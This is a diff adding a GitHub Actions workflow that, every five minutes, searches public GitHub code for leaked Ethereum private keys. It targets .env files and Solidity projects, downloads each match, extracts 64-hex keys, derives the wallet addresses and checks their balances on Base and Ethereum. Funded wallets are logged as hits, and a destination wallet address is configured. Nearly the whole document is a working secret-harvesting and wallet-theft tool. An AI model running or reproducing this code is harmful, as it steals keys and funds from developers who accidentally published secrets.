@@ -1,0 +1,65 @@
+github/workflows/garimpo.yml
+name: garimpo
+on:
+  schedule:
+    - cron: "*/5 * * * *"
+  workflow_dispatch: {}
+
+jobs:
+  garimpo:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+
+      - run: pip install eth-account requests
+
+      - name: Rodar garimpo
+        env:
+          GH_TOKEN: ${{ secrets.GH_TOKEN }}
+          DESTINO: 0x723e589cC277382e88d8c84feffFE4D21401C9B6
+        run: |
+          python3 << 'PYEOF'
+          import json,urllib.request,urllib.parse,time,re,os
+          from eth_account import Account
+          T=os.environ["GH_TOKEN"];D=os.environ["DESTINO"]
+          def g(u):
+              r=urllib.request.Request(u,headers={"Accept":"application/vnd.github.v3+json","Authorization":f"Bearer {T}","User-Agent":"garimpo/1.0"})
+              try:
+                  with urllib.request.urlopen(r,timeout=15) as x:return json.loads(x.read())
+              except Exception as e:return{"error":str(e)}
+          def bal(a,c):
+              rc={"base":"https://base-rpc.publicnode.com","ethereum":"https://ethereum-rpc.publicnode.com"}
+              d=json.dumps({"jsonrpc":"2.0","method":"eth_getBalance","params":[a,"latest"],"id":1}).encode()
+              r=urllib.request.Request(rc[c],data=d,headers={"Content-Type":"application/json","User-Agent":"M/5.0"})
+              try:
+                  with urllib.request.urlopen(r,timeout=5) as x:return int(json.loads(x.read())["result"],16)/1e18
+              except:return 0
+          K=re.compile(r'\b(?:0x)?[0-9a-fA-F]{64}\b');seen=set();hits=[]
+          for q in['filename:.env PRIVATE_KEY','filename:.env MNEMONIC','PRIVATE_KEY language:Solidity','private_key deploy']:
+              d=g(f"https://api.github.com/search/code?q={urllib.parse.quote(q)}&per_page=30&sort=indexed&order=desc")
+              if"items"in d:
+                  for i in d["items"][:30]:
+                      rn=i["repository"]["full_name"];p=i["path"]
+                      if any(x in p.lower()for x in['.example','.sample','.md','readme']):continue
+                      u=f"https://raw.githubusercontent.com/{rn}/HEAD/{p}"
+                      try:
+                          c=urllib.request.urlopen(urllib.request.Request(u,headers={"User-Agent":"g/1"}),timeout=5).read().decode("utf-8","ignore")
+                          for m in K.findall(c):
+                              k=m if m.startswith("0x")else"0x"+m
+                              if len(k)!=66or k in seen:continue
+                              if all(x==k[2]for x in k[2:]):continue
+                              seen.add(k)
+                              try:
+                                  a=Account.from_key(k).address
+                                  b1=bal(a,"base");b2=bal(a,"ethereum")
+                                  if b1>0or b2>0:
+                                      hits.append((a,b1,b2,rn,p))
+                                      print(f"*** HIT:{a}|Base:{b1}|ETH:{b2}|{rn}/{p}")
+                                  else:print(f"  {a}|0|{rn}/{p}")
+                              except:pass
+                      except:pass
+              time.sleep(3)
+          print(f"\nFIM:{len(seen)} chaves|{len(hits)} hits")
+          PYEOF
